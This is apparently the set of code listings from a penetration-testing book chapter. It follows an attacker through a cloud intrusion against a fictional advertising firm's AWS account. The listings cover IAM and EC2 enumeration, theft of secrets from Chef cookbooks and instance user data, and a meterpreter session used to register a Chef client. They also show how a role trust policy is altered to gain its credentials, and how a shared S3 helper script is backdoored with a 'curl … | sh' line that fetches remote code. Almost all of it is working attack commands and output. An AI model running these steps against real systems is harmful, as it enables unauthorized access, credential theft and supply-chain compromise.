["```\nroot@Point1:~/# **aws iam get-user --profile kevin**\n\"User\": {\n   \"UserName\": \"kevin.duncan\",\n`--snip--`\n```", "```\nroot@Point1:~/# **aws iam list-attached-user-policies \\**\n**--user-name=kevin.duncan \\**\n**--profile kevin**\n\n\"PolicyArn\": \"arn:aws:iam::886371554408:policy/mxrads-self-manage\",\n\"PolicyArn\": \"arn:aws:iam::886371554408:policy/mxrads-read-only\",\n\"PolicyArn\": \"arn:aws:iam::886371554408:policy/mxrads-eks-admin\"\n```", "```\nroot@Point1:~/# **aws iam get-policy \\**\n**--policy-arn mxrads-self-manage \\**\n**--profile kevin**\n\nAn error occurred (AccessDenied) when calling the GetPolicy operation:\nUser: arn:aws:iam::886371554408:user/kevin.duncan is not authorized to\nperform: iam:GetPolicy on resource: policy\narn:aws:iam::886371554408:policy/mxrads-eks-admin...\n```", "```\nroot@Point1:~/# **aws resourcegroupstaggingapi get-resources \\**\n**--region eu-west-1 \\**\n**--profile kevin > tagged_resources_euw1.txt**\n\nroot@Point1:~/# **head tagged_resources_euw1.txt**\n\nResourceARN: arn:aws:ec2:eu-west-1:886371554408:vpc/vpc-01e638,\nTags: [ \"Key\": \"Name\", \"Value\": \"privateVPC\"]\n--`snip`--\narn:aws:ec2:eu-west-1:886371554408:security-group/sg-07108...\narn:aws:lambda:eu-west-1:886371554408:function:tag_index\narn:aws:events:eu-west-1:886371554408:rule/asg-controller3\narn:aws:dynamodb:eu-west-1:886371554408:table/cruise_case\n`--snip--`\n```", "```\nroot@Point1:~/# **egrep -i \"gretsch|politico|gpoli\" tagged_resources_euw1.txt**\n\nResourceARN: arn:aws:lambda:eu-west-1:886477354405:function:dmp-sync-gretsch-politico,\n`--snip--`\n```", "```\nroot@Point1:~/# **aws lambda get-function  \\**\n**--function-name dmp-sync-gretsch-politico \\**\n**--region eu-west-1 \\**\n**--profile kevin**\n\n`--snip--`\nRepositoryType: S3,\nLocation: https://mxrads-lambdas.s3.eu-west-1.amazonaws.com/functions/dmp-sync-gp?versionId=YbSa...\n```", "```\nroot@Point1:~/# **aws s3api get-object \\**\n**--bucket mxrads-lambdas \\**\n**--key functions/dmp-sync-gp dmp-sync-gp \\**\n**--profile kevin**\n\nAn error occurred (AccessDenied) when calling the GetObject operation:\nAccess Denied\n```", "```\nroot@Point1:~/# **aws lambda get-function \\**\n**--function-name dmp-sync-gretsch-politico \\**\n**--region eu-west-1 \\**\n**--profile kevin**\n\n`--snip--`\nRole: arn:aws:iam::886371554408:role/lambda-dmp-sync,\nEnvironment: {\n   Variables: {\n     1 SRCBUCKET: mxrads-logs,\n     2 DSTBUCKET: gretsch-streaming-jobs,\n      SLACK_WEBHOOK: AQICAHajdGiAwfogxzeE887914...,\n      DB_LOGS_PASS: AQICAHgE4keraj896yUIeg93GfwEnep...\n`--snip--`\n```", "```\nroot@Point1:~/# **aws ec2 describe-instances \\**\n**--region=eu-west-1 \\**\n**--profile kevin > all_instances_euw1.txt**\n\nroot@Point1:~/# **head all_instances_euw1.txt**\n--`snip`--\n\"InstanceId\": \"i-09072954011e63aer\",\n\"InstanceType\": \"c5.4xlarge\",\n\"Key\": \"Name\",  \"Value\": \"cassandra-master-05789454\"\n\n\"InstanceId\": \"i-08777962411e156df\",\n\"InstanceType\": \"m5.8xlarge\",\n\"Key\": \"Name\",  \"Value\": \"lib-jobs-dev-778955944de\"\n\n\"InstanceId\": \"i-08543949421e17af\",\n\"InstanceType\": \"c5d.9xlarge\",\n\"Key\": \"Name\",  \"Value\": \"analytics-tracker-master-7efece4ae\"\n\n`--snip--`\n```", "```\nroot@Point1:~/# **egrep -i -1 \\**\n**\"jenkins|rundeck|chef|terraform|puppet|circle|travis|graphite\" all_instances_euw1.txt**\n\n\"InstanceId\": \"i-09072954011e63aer\",\n\"Key\": \"Name\",  \"Value\": \"jenkins-master-6597899842\"\nPrivateDnsName\": \"ip-10-5-20-239.eu-west-1.compute.internal\"\n\n\"InstanceId\": \"i-08777962411e156df\",\n\"Key\": \"Name\",  \"Value\": \"chef-server-master-8e7fea545ed\"\nPrivateDnsName\": \"ip-10-5-29-139.eu-west-1.compute.internal\"\n\n\"InstanceId\": \"i-08777962411e156df\",\n\"Key\": \"Name\",  \"Value\": \"jenkins-worker-e7de87adecc\"\nPrivateDnsName\": \"ip-10-5-10-58.eu-west-1.compute.internal\"\n\n`--snip--`\n```", "```\n# Our backdoored pod on the Kubernetes cluster\n\nmeterpreter > **execute curl -I -X GET -D http://ip-10-5-20-239.eu-west-1.compute.internal:8080**\n\nHTTP/1.1 301\nLocation: https://www.github.com/hub/oauth_login\ncontent-type: text/html; charset=iso-8859-1\n`--snip--`\n```", "```\n# recipe.rb\n\n# Copy the file seed-config.json on the new machine\ncookbook_file config_json do\n  source 'seed-config.json'\n  owner 'root'\nend\n\n# Append the user admin to the docker group\ngroup 'docker' do\n    group_name 'docker'\n    append  true\n    members 'admin'\n    action  :manage\nend\n`--snip--`\n```", "```\n# list_repos.py\nfrom github import Github\ng = Github(\"9c13d31aaedc0cc351dd12cc45ffafbe89848020\")\nfor repo in g.get_user().get_repos():\n    print(repo.name, repo.clone_url)\n```", "```\nroot@Point1:~/# **python3 list_repos.py > list_repos.txt**\nroot@Point1:~/# **egrep -i \"cookbook|jenkins|chef\" list_repos.txt**\ncookbook-generator https://github.com/mxrads/cookbook-generator.git\ncookbook-mxrads-ami https://github.com/mxrads/cookbook-ami.git\n1 cookbook-mxrads-jenkins-ci https://github.com/mxrads/cookbook-jenkins-ci.git\n--`snip`--\n```", "```\nroot@Point1:~/# **git clone https://github.com/mxrads/cookbook-jenkins-ci.git**\n```", "```\nroot@Point1:~/# **egrep -i \"password|secret|token|key\" cookbook-jenkins-ci**\n\ndefault['jenkins']['keys']['operations_redshift_rw_password'] = 'AQICAHhKmtEfZEcJQ9X...'\ndefault['jenkins']['keys']['operations_aws_access_key_id'] = 'AQICAHhKmtEfZEcJQ9X...'\ndefault['jenkins']['keys']['operations_aws_secret_access_key'] = 'AQICAHhKmtEfZEcJQ9X1w...'\ndefault['jenkins']['keys']['operations_price_cipher_crypto_key'] = 'AQICAHhKmtEfZE...'\n```", "```\n# README.md\n\nKMS Encryption :\n\nSecrets must now be encrypted using KMS. Here is how to do so.\nLet's say your credentials are in /path/to/credentials...\n```", "```\nroot@Point1:~/# **git rev-list --all | xargs git grep \"aws_secret\"**\n\ne365cd828298d55...:secrets.rb:\ndefault['jenkins']['keys']['operations_aws_secret_access_key'] = 'AQICAHhKmtEfZEcJQ9X1w...'\n\n623b30f7ab4c18f...:secrets.rb:\ndefault['jenkins']['keys']['operations_aws_secret_access_key'] = 'AQICAHhKmtEfZEcJQ9X1w...'\n```", "```\nroot@Point1:~/# **while read p; do**\n **instanceID=$(aws ec2 describe-instances \\**\n **--filter \"Name=tag:Name,Values=*$p*\" \\**\n **--query 'Reservations[0].Instances[].InstanceId' \\**\n **--region=eu-west-1 \\**\n **--output=text)**\n **echo $instanceID > list_ids.txt**\n**done <services.txt**\n```", "```\nroot@Point1:~/# **head list_ids.txt**\ni-08072939411515dac\ni-080746959025ceae\ni-91263120217ecdef\n`--snip--`\n```", "```\nroot@Point1:~/# **while read p; do**\n **userData=$(aws ec2 describe-instance-attribute \\**\n **--instance-id $p \\**\n **--attribute userData \\**\n **--region=eu-west-1 \\**\n **| jq -r .UserData.Value | base64 -d)**\n **echo $userData > $p.txt**\n**done <list_ids.txt**\n```", "```\nroot@Point1:~/# **ls -l i-*.txt |wc -l**\n21\nroot@Point1:~/# **cat i-08072939411515dac.txt**\nencoding: gzip+base64\n  path: /etc/ssh/auth_principals/user\n  permissions: \"0644\"\n- content: |-\n    #!/bin/bash\n`--snip--`\n```", "```\nroot@Point1:~/# **grep -7 \"BEGIN RSA PRIVATE KEY\" i-*.txt**\n`--snip--`\n1 cat << EOF\nchef_server_url 'https://chef.mxrads.net/organizations/mxrads'\nvalidation_client_name 'chef-validator'\nEOF\n)> /etc/chef/client.rb\n\n`--snip--`\n2 cat << EOF\n-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEAqg/6woPBdnwSVjcSRQenRJk0MePELfPp\n`--snip--`\n)> /etc/chef/validation.pem\n```", "```\nmeterpreter > **execute -i -f cat << EOF**\nchef_server_url 'https://chef.mxrads.net/organizations/mxrads'\nvalidation_client_name 'chef-validator'\nEOF\n)> /etc/chef/client.rb\n\nmeterpreter > **execute -i -f cat << EOF**\n-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEAqg/6woPBdnwSVjcSRQenRJk0MePELfPp\n`--snip--`\n)> /etc/chef/validation.pem\n```", "```\nmeterpreter > **execute -i -f apt update && apt install -y chef**\nmeterpreter > **execute -i -f chef-client**\n\nStarting Chef Client, version 14.8.12\nCreating a new client identity for aws-node-78ec.eu-west-1.compute.internal\nusing the validator key.\n\nSynchronizing Cookbooks:\nInstalling Cookbook Gems:\nCompiling Cookbooks...\nRunning handlers complete\nChef Client finished, 0/0 resources updated in 05 seconds\n\nmeterpreter > **ls /etc/chef/**\n\nclient.pem client.rb validation.pem\n```", "```\n# ~/root/.chef/knife.rb\nnode_name       'aws-node-78ec.eu-west-1.compute.internal'\nclient_key      '/etc/chef/client.pem'\nchef_server_url 'https://chef.mxrads.net/organizations/mxrads'\nknife[:editor] = '/usr/bin/vim'\n```", "```\nmeterpreter > **knife cookbooks list**\napt                         7.2.0\nark                         4.0.0\nbuild-essential             8.2.1\njenkins-ci                  10.41.5\n`--snip--`\n```", "```\nmeterpreter > **knife cookbooks show jenkins-ci**\n10.9.5 10.9.4 10.9.4 10.9.3 10.9.2 10.9.1 10.9.8 10.9.7...\n4.3.1 4.3.0 3.12.9 3.11.8 3.11.7 3.9.3 3.9.2 3.9.1\n```", "```\nmeterpreter > **knife cookbooks show jenkins-ci 10.8.6**\nattributes:\n  checksum:    320a841cd55787adecbdef7e7a5f977de12d30\n  name:        attributes/secrets.rb\n  url:         https://chef.mxrads.net:443/bookshelf/organization-\n26cbbe406c5e38edb280084b00774500/checksum-320a841cd55787adecbdef7e7a5f977de12d30?AWSAccessKeyId=25ecce65728a200d6de4bf782ee0a5087662119\n&Expires=1576042810&Signature=j9jazxrJjPkHQNGtqZr1Azu%2BP24%3D\n--`snip`--\nmeterpreter > **curl https://chef.mxrads.net:443/bookshelf/org...**\n\n1'AWS_JENKINS_ID' => 'AKIA55ZRK6ZS2XX5QQ4D',\n  'AWS_JENKINS_SECRET' => '6yHF+L8+u7g7RmHcudlCqWIg0SchgT',\n`--snip--`\n```", "```\nroot@Point1:~/# **vi ~/.aws/credentials**\n[jenkins]\naws_access_key_id = AKIA55ZRK6ZS2XX5QQ4D\naws_secret_access_key = 6yHF+L8+u7g7RmHcudlCqWIg0SchgT\n\n# get username\nroot@Point1:~/# **aws iam get-user --profile jenkins**\n\"UserName\": \"jenkins\"\n\n# list attached policies\nroot@Point1:~/# **aws iam list-attached-user-policies \\**\n**--user-name=jenkins \\**\n**--profile jenkins**\n\n\"PolicyName\": \"jenkins-policy\",\n\"PolicyArn\": \"arn:aws:iam::aws:policy/jenkins-policy\"\n\n# get policy version\nroot@Point1:~/# **aws iam iam get-policy \\**\n**--policy-arn arn:aws:iam::886371554408:policy/jenkins-policy \\**\n**--profile jenkins**\n\n\"DefaultVersionId\": \"v4\",\n\n# get policy content\n\nroot@Point1:~/# **aws iam iam get-policy-version \\**\n**--policy-arn arn:aws:iam::886371554408:policy/jenkins-policy \\**\n**--version v4 \\**\n**--profile jenkins**\n`--snip--`\n\"Action\": [\n        \"iam:*\",\n        \"ec2:*\",\n        \"sts:*\",\n        \"lambda:*\",\n         . . .\n         ],\n        \"Resource\": \"*\"\n`--snip--`\n```", "```\nroot@Point1:~/# **export AWS_PROFILE=jenkins**\nroot@Point1:~/# **aws iam get-role lambda-dmp-sync**\n \"RoleName\": \"dmp-sync\",\n \"Arn\": \"arn:aws:iam::886371554408:role/dmp-sync\",\n \"AssumeRolePolicyDocument\": {\n     \"Version\": \"2012-10-17\",\n     \"Statement\": [{\n          \"Effect\": \"Allow\",\n          \"Principal\": {\n \"Service\": \"lambda.amazonaws.com\"\n           },\n              \"Action\": \"sts:AssumeRole\"\n      }]\n`--snip--`\n```", "```\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [{\n     \"Effect\": \"Allow\",\n     \"Principal\": {\n        \"Service\": \"lambda.amazonaws.com\",\n        \"AWS\": \"arn:aws:iam::886371554408:user/jenkins\"\n     },\n     \"Action\": \"sts:AssumeRole\"\n  }]\n}\n```", "```\n root@Point1:~/# **aws iam update-assume-role-policy \\**\n**--role-name lambda-dmp-sync \\**\n**--policy-document file://new_policy.json**\n\nroot@Point1:~/# **aws sts assume-role \\**\n**--role-arn arn:aws:iam::886371554408:user/lambda-dmp-sync \\**\n**--role-session-name AWSCLI-Session \\**\n**--duration-seconds 43200**\n\n\"AccessKeyId\": \"ASIA44ZRK6WSZAFXRBQF\",\n\"SecretAccessKey\": \"nSiNoOEnWIm8h3WKXqgRG+mRu2QVN0moBSTjRZWC\",\n\"SessionToken\": \"FwoGZXIvYXdzEL///...\n\"Expiration\": \"2019-12-12T10:31:53Z\"\n```", "```\nroot@Point1:~/# **aws iam update-assume-role-policy \\**\n**--role-name lambda-dmp-sync \\**\n**--policy-document file://old_policy.json\\**\n**--profile jenkins**\n```", "```\nroot@Point1:~/# **vi ~/.aws/credentials**\n[dmp-sync]\naws_access_key_id = ASIA44ZRK6WSZAFXRBQF\naws_secret_access_key = nSiNoOEnWIm8h3WKXqgRG+mRu2QVN0moBSTjRZWC\naws_session_token = FwoGZXIvYXdzEL//...\n\nroot@Point1:~/# **aws s3api list-objects-v2 \\**\n**--bucket gretsch-streaming-jobs \\**\n**--profile dmp-sync > list_objects_gp.txt**\n\nroot@Point1:~/# **head list_objects_gp.txt**\n\n\"Key\": \"rtb-bid-resp/2019/12/11/10/resp-0-141d08-ecedade-123...\",\n\"Key\": \"rtb-bid-resp/2019/12/11/10/resp-0-753a10-3e1a3cb-51c...\",\n\"Key\": \"rtb-bid-resp/2019/12/11/10/resp-0-561058-8e85acd-175...\",\n\"Key\": \"rtb-bid-resp/2019/12/11/10/resp-1-091bd8-135eac7-92f...\",\n\"Key\": \"rtb-bid-resp/2019/12/11/10/resp-1-3f1cd8-dae14d3-1fd...\",\n--`snip`--\n```", "```\n\"Key\": \"helpers/ecr-login.sh\",\n\"LastModified\": \"2019-11-14T15:10:43.000Z\",\n\n\"Key\": \"helpers/go-manage\",\n\"LastModified\": \"2019-11-14T15:10:43.000Z\",\n`--snip--`\n```", "```\nroot@Point1:~/# **aws s3api put-object \\**\n**--bucket gretsch-streaming-jobs \\**\n**--key helpers/test.html --body test.html \\**\n**--profile dmp-sync**\n\n\"ETag\": \"\\\"051aa2040dafb7fa525f20a27f5e8666\\\"\"\n```", "```\nroot@Point1:~/# **aws s3api get-object \\**\n**--bucket gretsch-streaming-jobs\\**\n**--key helpers/ecr_login.sh ecr-login.sh \\**\n**--profile dmp-sync**\n\nroot@Point1:~/# **echo \"true || curl https://gretsch-helpers.s3.amazonaws.com/helper.sh |sh\" >> ecr-login.sh**\n\nroot@Point1:~/# **aws s3api put-object \\**\n**--bucket gretsch-streaming-jobs \\**\n**--key helpers/ecr-login.sh \\**\n**--body ecr-login.sh \\**\n**--profile dmp-sync**\n```"]